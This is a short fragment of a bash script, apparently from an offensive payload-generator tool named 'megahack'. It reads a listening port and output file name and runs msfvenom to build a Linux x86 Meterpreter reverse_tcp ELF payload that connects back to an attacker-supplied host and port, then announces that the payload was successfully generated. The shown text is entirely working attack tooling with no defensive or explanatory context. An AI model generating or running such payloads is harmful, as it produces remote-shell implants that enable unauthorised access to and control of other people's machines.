...
read lport
echo " "
tput setaf 3; echo " OUTPUT LANGUE"
read out
echo " "
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -f elf > $HOME/megahack/output/linux/"$out" && tput setaf 2; echo " PAYLOAD SUCCESSFULLY GENERATED"
